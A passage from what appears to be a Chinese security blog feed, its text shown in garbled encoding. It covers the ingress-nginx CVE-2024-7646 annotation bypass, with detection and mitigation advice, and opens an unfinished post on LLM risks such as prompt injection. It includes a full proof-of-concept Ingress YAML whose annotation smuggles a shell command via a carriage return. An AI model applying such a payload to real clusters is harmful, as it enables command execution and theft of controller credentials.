1ï¼šæ¼æ´æè¿°ï¼ˆæ¥è‡ªï¼šNVDï¼‰"></p><h2 id="0x02-å—å½±å“çš„ç‰ˆæœ¬"><a href="#0x02-å—å½±å“çš„ç‰ˆæœ¬" class="headerlink" title="0x02 å—å½±å“çš„ç‰ˆæœ¬"></a>0x02 å—å½±å“çš„ç‰ˆæœ¬</h2><table><thead><tr><th>æ§åˆ¶å™¨</th><th>å—å½±å“çš„ç‰ˆæœ¬</th></tr></thead><tbody><tr><td>ingress-nginx</td><td>&lt; v1.11.2</td></tr></tbody></table><h2 id="0x03-æ‰€éœ€æƒé™"><a href="#0x03-æ‰€éœ€æƒé™" class="headerlink" title="0x03 æ‰€éœ€æƒé™"></a>0x03 æ‰€éœ€æƒé™</h2><p>è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…éœ€è¦ä»¥ä¸‹ Kubernetes RBAC æƒé™ï¼š</p><ol><li>æ‹¥æœ‰åœ¨ <code>networking.k8s.io</code> æˆ– extensions API ç»„ä¸‹åˆ›å»ºæˆ–ä¿®æ”¹ Ingress èµ„æºçš„æƒé™ã€‚</li><li>è‡³å°‘éœ€è¦èƒ½å¤Ÿè¿›å…¥ä¸€ä¸ªå‘½åç©ºé—´ï¼Œä»¥ä¾¿åœ¨å…¶ä¸­åˆ›å»ºç›¸åº”çš„ Ingress èµ„æºã€‚</li></ol><p>è¿™äº›æƒé™å¾€å¾€èµ‹äºˆäº†è´Ÿè´£éƒ¨ç½²åº”ç”¨çš„å¼€å‘äººå‘˜æˆ–æœåŠ¡è´¦å·ï¼Œè¿™ä½¿å¾—åœ¨æ²¡æœ‰ä¸¥æ ¼æ‰§è¡Œæœ€å°æƒé™åŸåˆ™çš„ç¯å¢ƒä¸­ï¼Œè¯¥æ¼æ´çš„å±å®³æ€§å°¤ä¸ºä¸¥é‡ã€‚</p><h2 id="0x04-å¤ç°æ­¥éª¤"><a href="#0x04-å¤ç°æ­¥éª¤" class="headerlink" title="0x04 å¤ç°æ­¥éª¤"></a>0x04 å¤ç°æ­¥éª¤</h2><h3 id="4-1-ç¡®å®šç›®æ ‡"><a href="#4-1-ç¡®å®šç›®æ ‡" class="headerlink" title="4.1 ç¡®å®šç›®æ ‡"></a>4.1 ç¡®å®šç›®æ ‡</h3><p>è‹¥æ”»å‡»è€…æ‹¥æœ‰åˆ›å»º Ingress èµ„æºçš„æƒé™ï¼Œé¦–å…ˆä¼šå»æ‰¾å®‰è£…äº† ingress-nginx çš„é›†ç¾¤ï¼Œå¹¶ç¡®å®šè¯¥ ingress-nginx æ˜¯å¦å¤„äºå—å½±å“çš„ç‰ˆæœ¬èŒƒå›´ä¹‹å†…ã€‚</p><h3 id="4-2-åˆ¶ä½œæ¶æ„-Ingress-å¯¹è±¡"><a href="#4-2-åˆ¶ä½œæ¶æ„-Ingress-å¯¹è±¡" class="headerlink" title="4.2 åˆ¶ä½œæ¶æ„ Ingress å¯¹è±¡"></a>4.2 åˆ¶ä½œæ¶æ„ Ingress å¯¹è±¡</h3><p>æ”»å‡»è€…ä½¿ç”¨ç‰¹åˆ¶æ³¨é‡Šåˆ›å»º Ingress å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«å›è½¦ç¬¦ (\r) æ¥ç»•è¿‡éªŒè¯ã€‚</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">networking.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Ingress</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">malicious-ingress</span><br>  <span class="hljs-comment"># æ‰§è¡Œæ¶æ„å‘½ä»¤</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">nginx.ingress.kubernetes.io/auth-tls-verify-client:</span> <span class="hljs-string">&quot;on\r$(id &gt; /tmp/pwned)&quot;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">rules:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">host:</span> <span class="hljs-string">example.com</span><br>    <span class="hljs-attr">http:</span><br>      <span class="hljs-attr">paths:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br>        <span class="hljs-attr">pathType:</span> <span class="hljs-string">Prefix</span><br>        <span class="hljs-attr">backend:</span><br>          <span class="hljs-attr">service:</span><br>            <span class="hljs-attr">name:</span> <span class="hljs-string">example-service</span><br>            <span class="hljs-attr">port:</span> <br>              <span class="hljs-attr">number:</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>&#x20;<code>annotations</code> å­—æ®µç”¨äºæ·»åŠ é¢å¤–çš„å…ƒæ•°æ®æˆ–é…ç½®æ¥ç»™ Ingress æ§åˆ¶å™¨æˆ–å…¶ä»–æ’ä»¶ä½¿ç”¨ï¼Œä»¥ä¾¿åœ¨å¤„ç†è¯·æ±‚æ—¶åº”ç”¨ç‰¹å®šçš„è§„åˆ™æˆ–è¡Œä¸ºï¼Œä¾‹å¦‚ï¼š</p><ol><li><p>é…ç½® NGINX Ingress æ§åˆ¶å™¨ï¼Œå¯ç”¨ TLS å®¢æˆ·ç«¯è®¤è¯ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">annotations:</span><br>  <span class="hljs-attr">nginx.ingress.kubernetes.io/auth-tls-verify-client:</span> <span class="hljs-string">&quot;on&quot;</span><br><br></code></pre></td></tr></table></figure></li><li><p>é…ç½® AWS è´Ÿè½½å‡è¡¡æ§åˆ¶å™¨çš„ç±»å‹ï¼Œä½¿ç”¨ç½‘ç»œè´Ÿè½½å‡è¡¡å™¨ï¼ˆnlbï¼‰</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">annotations:</span><br>  <span class="hljs-attr">service.beta.kubernetes.io/aws-load-balancer-type:</span> <span class="hljs-string">&quot;nlb&quot;</span><br><br></code></pre></td></tr></table></figure></li></ol><p>è¿™äº›æ³¨é‡Šçš„å€¼é€šå¸¸æ˜¯ä¸€äº›å­—ç¬¦ä¸²ï¼Œä½†ä¹Ÿå¯ä»¥æ ¹æ®ç›®çš„å’Œå®ç°æ–¹å¼ï¼ŒåŒ…å«ä¸€äº›å¤æ‚çš„å†…å®¹ï¼Œä¾‹å¦‚ä½¿ç”¨å›è½¦ç¬¦ï¼ˆ<code>\r</code>ï¼‰ç»•è¿‡éªŒè¯ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">nginx.ingress.kubernetes.io/auth-tls-verify-client:</span> <span class="hljs-string">&quot;on\r$(id &gt; /tmp/pwned)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="4-3-åº”ç”¨æ¶æ„-Ingress"><a href="#4-3-åº”ç”¨æ¶æ„-Ingress" class="headerlink" title="4.3 åº”ç”¨æ¶æ„ Ingress"></a>4.3 åº”ç”¨æ¶æ„ Ingress</h3><p>ç„¶åå†å°†è¯¥ Ingress å¯¹è±¡åº”ç”¨åˆ°è¯¥é›†ç¾¤ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl apply -f malicious-ingress.yaml<br></code></pre></td></tr></table></figure><h3 id="4-4-å‘½ä»¤æ‰§è¡Œ"><a href="#4-4-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="4.4 å‘½ä»¤æ‰§è¡Œ"></a>4.4 å‘½ä»¤æ‰§è¡Œ</h3><p>å½“ ingress-nginx å¤„ç†è¿™ä¸ª Ingress å¯¹è±¡æ—¶ï¼Œå› ä¸ºæ— æ³•éªŒè¯æ³¨é‡Šï¼Œä»è€Œå¯¼è‡´æ‰€æ³¨å…¥çš„æ¶æ„å‘½ä»¤è¢«æ‰§è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">id</span> &gt; /tmp/pwned<br></code></pre></td></tr></table></figure><h3 id="4-5-å‡­è¯"><a href="#4-5-å‡­è¯" class="headerlink" title="4.5 å‡­è¯"></a>4.5 å‡­è¯</h3><p>ä¸€æ—¦æ”»å‡»è€…æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼Œä»–ä»¬å°±å¯èƒ½è·å–åˆ° ingress-nginx æ§åˆ¶å™¨çš„è®¤è¯ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯åœ¨é›†ç¾¤ä¸­å¯èƒ½æ‹¥æœ‰å¹¿æ³›çš„è®¿é—®æƒé™ã€‚</p><h2 id="0x05-é£é™©åˆ†æ"><a href="#0x05-é£é™©åˆ†æ" class="headerlink" title="0x05 é£é™©åˆ†æ"></a>0x05 é£é™©åˆ†æ</h2><p>ä»¥ä¸‹ Kubernetes ç¯å¢ƒå°†å—åˆ°ç‰¹åˆ«é«˜çš„å¨èƒï¼š</p><ul><li>éç®¡ç†å‘˜ç”¨æˆ·æœ‰æƒåˆ›å»º Ingress å¯¹è±¡çš„å¤šç§Ÿæˆ· Kubernetes ç¯å¢ƒã€‚</li><li>ä½¿ç”¨é»˜è®¤é…ç½®éƒ¨ç½² ingress-nginx çš„é›†ç¾¤ï¼Œæˆäºˆå¯¹é›†ç¾¤ secret çš„å¹¿æ³›è®¿é—®æƒé™ã€‚</li><li>æ²¡æœ‰ä¸¥æ ¼çš„ RBAC ç­–ç•¥æ¥é™åˆ¶è°å¯ä»¥åˆ›å»ºæˆ–ä¿®æ”¹ Ingress å¯¹è±¡çš„ç¯å¢ƒã€‚</li></ul><h2 id="0x06-æ£€æµ‹æ–¹æ³•"><a href="#0x06-æ£€æµ‹æ–¹æ³•" class="headerlink" title="0x06 æ£€æµ‹æ–¹æ³•"></a>0x06 æ£€æµ‹æ–¹æ³•</h2><ol><li><p>æ£€æŸ¥æ˜¯å¦å®‰è£…äº†<code>ingress-nginx</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl get po -A | grep ingress-nginx-controller<br></code></pre></td></tr></table></figure></li><li><p>è‹¥å·²å®‰è£…ï¼Œè¯·æ£€æŸ¥ç‰ˆæœ¬ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">kubectl <span class="hljs-built_in">exec</span> -it &lt;ingress-nginx-pod&gt; -n &lt;namespace&gt; -- /nginx-ingress-controller --version<br></code></pre></td></tr></table></figure></li></ol><h2 id="0x07-ç¼“è§£æªæ–½"><a href="#0x07-ç¼“è§£æªæ–½" class="headerlink" title="0x07 ç¼“è§£æªæ–½"></a>0x07 ç¼“è§£æªæ–½</h2><ol><li><strong>æ›´æ–° ingress-nginx çš„ç‰ˆæœ¬ï¼š</strong> å°† ingress-nginx å‡çº§è‡³ v1.11.2 æˆ–æ›´æ–°çš„ç‰ˆæœ¬ã€‚</li><li><strong>æ£€æŸ¥ Ingress èµ„æºï¼š</strong> å¯¹ç°æœ‰çš„ Ingress èµ„æºè¿›è¡Œå®¡è®¡ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å¯ç–‘çš„æ³¨é‡Šï¼Œç‰¹åˆ«éœ€è¦æ£€æŸ¥æ˜¯å¦åŒ…å«å›è½¦ç¬¦ï¼ˆ<code>\r</code>ï¼‰ã€‚</li><li><strong>æ‰§è¡Œä¸¥æ ¼çš„åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰ï¼š</strong> åªå…è®¸å—ä¿¡ä»»çš„ç”¨æˆ·å’ŒæœåŠ¡è´¦æˆ·åˆ›å»ºå’Œä¿®æ”¹ Ingress èµ„æºã€‚</li><li><strong>å¼€å¯ Kubernetes çš„å®¡è®¡æ—¥å¿—åŠŸèƒ½ï¼š</strong> å¯»æ‰¾æ˜¯å¦å­˜åœ¨åˆ©ç”¨è¯¥æ¼æ´çš„è¡Œä¸ºã€‚</li><li><strong>é‡‡ç”¨å‡†å…¥æ§åˆ¶ï¼š</strong> éƒ¨ç½²<code>ValidatingAdmissionWebhooks</code>ï¼Œä»¥å¯¹ Ingress èµ„æºåŠå…¶æ³¨è§£è¿›è¡Œæ›´ä¸¥æ ¼çš„æ ¡éªŒã€‚</li></ol><h2 id="0x08-æ€»ç»“"><a href="#0x08-æ€»ç»“" class="headerlink" title="0x08 æ€»ç»“"></a>0x08 æ€»ç»“</h2><p>CVE-2024-7646 äº‹ä»¶æé†’æˆ‘ä»¬ï¼Œä¿æŠ¤ Kubernetes ç¯å¢ƒçš„å®‰å…¨æ˜¯ä¸€é¡¹æŒç»­è¿›è¡Œã€æ°¸æ— ä¼‘æ­¢çš„ä»»åŠ¡ã€‚åœ¨ ingress-nginx è¿™ç±»å…³é”®ç»„ä»¶ä¸­ç»•è¿‡æ³¨è§£éªŒè¯çš„èƒ½åŠ›å‡¸æ˜¾äº†ä¿æŒè½¯ä»¶æœ€æ–°ã€æ‰§è¡Œä¸¥æ ¼è®¿é—®æ§åˆ¶å’ŒæŒç»­ç›‘æµ‹å®‰å…¨å¨èƒçš„é‡è¦æ€§ã€‚</p><p>éšç€ Kubernetes åœ¨ä¿¡æ¯æŠ€æœ¯åŸºç¡€è®¾æ–½ä¸­çš„å½±å“åŠ›æ—¥ç›Šå¢å¼ºï¼Œä¿æŒè­¦è§‰å¹¶ç§¯æé‡‡å–æªæ–½ç¡®ä¿å…¶å®‰å…¨å˜å¾—å°¤ä¸ºå…³é”®ã€‚å®šæœŸè¿›è¡Œå®‰å…¨å®¡æŸ¥ã€åŠæ—¶æ›´æ–°è¡¥ä¸ä»¥åŠéµå¾ªè§’è‰²åŸºç¡€è®¿é—®æ§åˆ¶ï¼ˆRBACï¼‰å’Œç½‘ç»œå®‰å…¨ç­–ç•¥çš„æœ€ä½³å®è·µï¼Œæ˜¯ç¡®ä¿å¼ºå¤§å®‰å…¨é˜²æŠ¤çš„å…³é”®ç­–ç•¥ã€‚</p><p>è¯·è®°ä½ï¼Œä¸ºäº†ä¿æŒå®‰å…¨ï¼Œæ‚¨éœ€è¦ä¸æ–­æ›´æ–°ç³»ç»Ÿï¼Œå¹¶ç¡®ä¿æ‚¨çš„ Kubernetes é›†ç¾¤èƒ½å¤ŸæŠµå¾¡æ–°å‡ºç°çš„å¨èƒã€‚æ‚¨å¯ä»¥ä»ä½¿ç”¨å®‰å…¨å·¥å…·ä¸å¹³å°å¯¹æ‚¨çš„é›†ç¾¤è¿›è¡Œæ‰«æå¼€å§‹ï¼Œä»¥è·å–å…³äºæ‚¨å®‰å…¨çŠ¶å†µçš„æœ€æ–°ä¿¡æ¯ã€‚</p><p>è¯¦æƒ…è¯·çœ‹ Kubernetes å®˜æ–¹çš„å®‰å…¨å…¬å‘Šï¼š</p><p><a href="https://github.com/kubernetes/kubernetes/issues/126744" title="CVE-2024-7646: Ingress-nginx Annotation Validation Bypass">CVE-2024-7646: Ingress-nginx Annotation Validation Bypass</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CVE æ¼æ´åˆ†æ</tag>
      
      <tag>Kubernetes å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>äº‘åŸç”Ÿåœºæ™¯ä¸‹çš„å¤§æ¨¡å‹åº”ç”¨é£é™©</title>
    <link href="/2024/08/16/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E9%A3%8E%E9%99%A9/"/>
    <url>/2024/08/16/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%BA%94%E7%94%A8%E9%A3%8E%E9%99%A9/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>2022 å¹´åº•ï¼Œéšç€ ChatGPT è¿›å…¥å¤§ä¼—å¸‚åœºï¼Œäººä»¬å¯¹å¤§å‹è¯­è¨€æ¨¡å‹ï¼ˆLLMï¼ŒLarge Language Modelï¼‰çš„å…³æ³¨å°¤ä¸ºæµ“åšã€‚æ¸´æœ›åˆ©ç”¨ LLM æ½œåŠ›çš„ä¼ä¸šæ­£åœ¨è¿…é€Ÿå°†å…¶æ•´åˆåˆ°å…¶è¿è¥å’Œé¢å‘å®¢æˆ·çš„äº§å“ä¸­ã€‚</p><p>ç„¶è€Œï¼ŒLLM çš„é‡‡ç”¨é€Ÿåº¦å·²ç»è¶…è¿‡äº†å…¨é¢å®‰å…¨åè®®çš„å»ºç«‹é€Ÿåº¦ï¼Œå¯¼è‡´è®¸å¤šåº”ç”¨ç¨‹åºå®¹æ˜“å—åˆ°é«˜é£é™©é—®é¢˜çš„å½±å“ã€‚</p><p><strong>æœ¬æ–‡ï¼Œæˆ‘ä»¬å°†ä»¥ OWASP LLM top 10 ä½œä¸ºåˆ‡å…¥ç‚¹ï¼Œå‰–æäº‘åŸç”Ÿåœºæ™¯ä¸‹çš„ LLM é£é™©ã€‚</strong></p><h2 id="0x01-OWASP-LLM-top10"><a href="#0x01-OWASP-LLM-top10" class="headerlink" title="0x01 OWASP LLM top10"></a>0x01 OWASP LLM top10</h2><p>éšç€ GPTã€Llama 2 å’Œ Gemini ç­‰ LLM çš„æ¶Œç°ï¼ŒLLM ç›¸å…³çš„å®‰å…¨é£é™©ä¹Ÿå—åˆ°äº†å¤§å®¶çš„å…³æ³¨ï¼Œä¾‹å¦‚</p><ul><li><a href="https://simonwillison.net/2022/Sep/12/prompt-injection/" title="é’ˆå¯¹ GPT-3 çš„å³æ—¶æ³¨å…¥æ”»å‡»">é’ˆå¯¹ GPT-3 çš„å³æ—¶æ³¨å…¥æ”»å‡»</a></li><li><a href="https://embracethered.com/blog/posts/2023/chatgpt-plugin-vulns-chat-with-code/" title="å¯ä»¥è®¿é—®ç½‘ç«™å¹¶çªƒå–æºä»£ç çš„LLMæ’ä»¶æ¼æ´">å¯ä»¥è®¿é—®ç½‘ç«™å¹¶çªƒå–æºä»£ç çš„ LLM æ’ä»¶æ¼æ´</a></li><li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-5411357" title="å½±å“langchainçš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´">å½±å“ langchain çš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</a></li><li>â€¦â€¦</li></ul><p>å½“æ—¶ï¼ŒLLM è¿˜æ²¡æœ‰ç»Ÿä¸€çš„èµ„æºæ¥è§£å†³è¿™äº›å®‰å…¨é—®é¢˜ï¼Œå¾ˆå¤šå¼€å‘è€…ä¹Ÿå¯¹ LLM çš„ç›¸å…³é£é™©ä¸å¤Ÿäº†è§£ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œ2023 å¹´ 10 æœˆ 16 æ—¥ï¼Œæ¥è‡ªä¸åŒèƒŒæ™¯çš„è¿‘ 500 åä¸“å®¶å’Œè¶…è¿‡ 125 åç§¯æè´¡çŒ®è€…åœ¨å…¶ä¸“ä¸šçŸ¥è¯†çš„åŸºç¡€ä¸Šï¼Œè¿›è¡Œäº†ä¸€ä¸ªæœˆçš„é›†æ€å¹¿ç›Šï¼Œæå‡ºäº† LLM æ½œåœ¨çš„ 43 ä¸ªä¸åŒé£é™©ã€‚ç»è¿‡å¤šè½®çš„è®¨è®ºå’ŒæŠ•ç¥¨ï¼Œ<a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" title="OWASP">OWASP</a>æœ€ç»ˆå°†è¿™äº›ææ¡ˆç»†åŒ–ä¸ºåå¤§æœ€å…³é”®æ¼æ´çš„ç®€æ˜åˆ—è¡¨ã€‚</p><table><thead><tr><th>åºå·</th><th>é£é™©åç§°</th><th>é£é™©æè¿°</th></tr></thead><tbody><tr><td>LLM01</td><td>æç¤ºè¯ (Prompt) æ³¨å…¥ (Injection)</td><td>é»‘å®¢é€šè¿‡è®¾è®¡è¿‡çš„è¾“å…¥ (æç¤ºè¯) æ“çºµå¤§å‹è¯­è¨€æ¨¡å‹ (LLM)ï¼Œä»è€Œå¯¼è‡´ LLM æ‰§è¡Œæ„å¤–æ“ä½œã€‚æç¤ºè¯æ³¨å…¥ä¼šè¦†ç›–ç³»ç»Ÿæç¤ºè¯ï¼Œè€Œé—´æ¥æ³¨å…¥æ“çºµå¤–éƒ¨æ•°æ®æºè¿›è¡Œæ³¨å…¥æ”»å‡»ã€‚</td></tr><tr><td>LLM02</td><td>ä¸å®‰å…¨çš„è¾“å‡ºå¤„ç†</td><td>å½“ LLM è¾“å‡ºæœªç»å®¡æŸ¥è€Œè¢«æ¥å—æ—¶ï¼Œå°±ä¼šå‡ºç°æ­¤æ¼æ´ï¼Œä»è€Œæš´éœ²åç«¯ç³»ç»Ÿã€‚&#xA;æ»¥ç”¨å¯èƒ½ä¼šå¯¼è‡´ XSSã€CSRFã€SSRFã€æƒé™å‡çº§æˆ–è¿œç¨‹ä»£ç æ‰§è¡Œç­‰ä¸¥é‡åæœã€‚</td></tr><tr><td>LLM03</td><td>è®­ç»ƒæ•°æ®ä¸­æ¯’</td><td>å½“ LLM åŸ¹è®­æ•°æ®è¢«ç¯¡æ”¹ï¼Œå¼•å…¥æŸå®³å®‰å…¨æ€§ã€æœ‰æ•ˆæ€§æˆ–é“å¾·è¡Œä¸ºçš„æ¼æ´æˆ–åè§æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚æ¥æºåŒ…æ‹¬ Common Crawlã€WebTextã€OpenWebText å’Œä¹¦ç±ã€‚</td></tr><tr><td>LLM04</td><td>æ‹’ç»æœåŠ¡æ¨¡å‹</td><td>æ”»å‡»è€…å¯¹å¤§å‹è¯­è¨€æ¨¡å‹è¿›è¡Œèµ„æºå¯†é›†å‹æ“ä½œï¼Œå¯¼è‡´æœåŠ¡é™çº§æˆ–é«˜æˆæœ¬ã€‚ç”±äº LLM çš„èµ„æºå¯†é›†å‹æ€§è´¨å’Œç”¨æˆ·è¾“å…¥çš„ä¸å¯é¢„æµ‹æ€§ï¼Œè¯¥æ¼æ´è¢«æ”¾å¤§ã€‚</td></tr><tr><td>LLM05</td><td>ä¾›åº”é“¾æ¼æ´</td><td>LLM åº”ç”¨ç¨‹åºç”Ÿå‘½å‘¨æœŸå¯èƒ½ä¼šå—åˆ°æ˜“å—æ”»å‡»çš„ç»„ä»¶æˆ–æœåŠ¡çš„å½±å“ï¼Œä»è€Œå¯¼è‡´å®‰å…¨æ”»å‡»ã€‚ä½¿ç”¨ç¬¬ä¸‰æ–¹æ•°æ®é›†ã€é¢„å…ˆè®­ç»ƒçš„æ¨¡å‹å’Œæ’ä»¶å¯èƒ½ä¼šå¢åŠ æ¼æ´ã€‚</td></tr><tr><td>LLM06</td><td>æ•æ„Ÿä¿¡æ¯æŠ«éœ²</td><td>LLM å¯èƒ½ä¼šåœ¨å…¶å›å¤ä¸­æ³„éœ²æœºå¯†æ•°æ®ï¼Œä»è€Œå¯¼è‡´æœªç»æˆæƒçš„æ•°æ®è®¿é—®ã€éšç§ä¾µçŠ¯å’Œå®‰å…¨æ¼æ´ã€‚å®æ–½æ•°æ®æ¸…ç†å’Œä¸¥æ ¼çš„ç”¨æˆ·ç­–ç•¥æ¥ç¼“è§£è¿™ç§æƒ…å†µè‡³å…³é‡è¦ã€‚</td></tr><tr><td>LLM07</td><td>ä¸å®‰å…¨çš„æ’ä»¶è®¾è®¡</td><td>LLM æ’ä»¶å¯èƒ½å…·æœ‰ä¸å®‰å…¨çš„è¾“å…¥å’Œä¸è¶³çš„è®¿é—®æ§åˆ¶ã€‚ç¼ºä¹åº”ç”¨ç¨‹åºæ§åˆ¶ä½¿å®ƒä»¬æ›´å®¹æ˜“è¢«åˆ©ç”¨ï¼Œå¹¶å¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œç­‰åæœã€‚</td></tr><tr><td>LLM08</td><td>è¿‡åº¦ä»£ç†</td><td>åŸºäº LLM çš„ç³»ç»Ÿå¯èƒ½ä¼šé‡‡å–å¯¼è‡´æ„æƒ³ä¸åˆ°çš„åæœçš„è¡ŒåŠ¨ã€‚è¯¥é—®é¢˜æºäºæˆäºˆåŸºäº LLM çš„ç³»ç»Ÿè¿‡å¤šçš„åŠŸèƒ½ã€æƒé™æˆ–è‡ªä¸»æƒã€‚</td></tr><tr><td>LLM09</td><td>è¿‡åº¦ä¾èµ–</td><td>è¿‡åº¦ä¾èµ– LLM è€Œä¸å—ç›‘ç£çš„ç³»ç»Ÿæˆ–äººå‘˜å¯èƒ½ä¼šå›  LLM ç”Ÿæˆçš„ä¸æ­£ç¡®æˆ–ä¸é€‚å½“çš„å†…å®¹è€Œé¢ä¸´é”™è¯¯ä¿¡æ¯ã€æ²Ÿé€šä¸ç•…ã€æ³•å¾‹é—®é¢˜å’Œå®‰å…¨æ¼æ´ã€‚</td></tr><tr><td>LLM10</td><td>æ¨¡å‹ç›—çªƒ</td><td>è¿™æ¶‰åŠå¯¹ä¸“æœ‰ LLM æ¨¡å‹çš„æœªç»æˆæƒçš„è®¿é—®ã€å¤åˆ¶æˆ–æ³„éœ²ã€‚å½±å“åŒ…æ‹¬ç»æµæŸå¤±ã€ç«äº‰ä¼˜åŠ¿å—æŸä»¥åŠæ•æ„Ÿä¿¡æ¯çš„æ½œåœ¨è®¿é—®ã€‚</td></tr></tbody></table><h2 id="0x02-äº‘åŸç”Ÿäººå·¥æ™ºèƒ½ï¼ˆCNAIï¼‰"><a href="#0x02-äº‘åŸç”Ÿäººå·¥æ™ºèƒ½ï¼ˆCNAIï¼‰" class="headerlink" title="0x02 äº‘åŸç”Ÿäººå·¥æ™ºèƒ½ï¼ˆCNAIï¼‰"></a>0x02 äº‘åŸç”Ÿäººå·¥æ™ºèƒ½ï¼ˆCNAIï¼‰</h2><p>ä¸äººå·¥æ™ºèƒ½ä¸€æ ·ï¼Œäº‘åŸç”Ÿä½œä¸ºå½“ä»Šæœ€å…³é”®çš„æŠ€æœ¯è¶‹åŠ¿ï¼Œä¹Ÿä¸ºåº”ç”¨ç¨‹åºçš„è¿è¡Œæä¾›äº†å¯æ‰©å±•ä¸”å¯é çš„å¹³å°ï¼Œæ­£ç¨³æ­¥æˆä¸ºä¸»è¦çš„äº‘å·¥ä½œè´Ÿè½½ã€‚2024 å¹´ 3 æœˆ 19 æ—¥ï¼ŒCNCF å‘å¸ƒäº†<a href="https://www.cncf.io/reports/cloud-native-artificial-intelligence-whitepaper/" title="ã€ŠCloud Native Artificial Intelligence Whitepaperã€‹">ã€ŠCloud Native Artificial Intelligence Whitepaperã€‹</a>ï¼ˆäº‘åŸç”Ÿäººå·¥æ™ºèƒ½ç™½çš®ä¹¦ï¼‰ï¼Œä»‹ç»äº†å½“ä»Šæœ€å…ˆè¿›çš„ AI&#x2F;MLï¼ˆartificial intelligence and machine learningï¼Œäººå·¥æ™ºèƒ½å’Œæœºå™¨å­¦ä¹ ï¼‰æŠ€æœ¯ï¼Œå¸®åŠ©å·¥ç¨‹å¸ˆå’Œä¸šåŠ¡æˆå‘˜äº†è§£ä¸æ–­å˜åŒ–çš„äº‘åŸç”Ÿäººå·¥æ™ºèƒ½ç”Ÿæ€ç³»ç»ŸåŠå…¶æœºé‡ã€‚</p><p><img src="/image/image_z6qn7bZI8w.png" alt="å›¾ 1ï¼šcloud native AI" title="å›¾1ï¼šcloud native AI"></p><p>äº‘åŸç”Ÿäººå·¥æ™ºèƒ½ï¼ˆCNAIï¼ŒCloud Native Artificial Intelligenceï¼‰æŠ€æœ¯ä½¿å¾—æ„å»ºã€éƒ¨ç½²ã€è¿è¡Œå’Œæ‰©å±• AI åº”ç”¨å˜å¾—æ›´åŠ é«˜æ•ˆå’Œå®ç”¨ã€‚è¿™é¡¹æŠ€æœ¯è§£å†³äº† AI åº”ç”¨å¼€å‘è€…å’Œç§‘å­¦å®¶åœ¨äº‘å¹³å°ä¸Šé¢ä¸´çš„ä¸€ç³»åˆ—æŒ‘æˆ˜ï¼ŒåŒ…æ‹¬å¼€å‘ã€éƒ¨ç½²ã€è¿è¡Œã€æ‰©å±•å’Œç›‘æ§ AI å·¥ä½œè´Ÿè½½ç­‰æ–¹é¢ã€‚é€šè¿‡å……åˆ†åˆ©ç”¨äº‘åŸºç¡€è®¾æ–½çš„è®¡ç®—èµ„æºï¼ˆå¦‚ CPU å’Œ 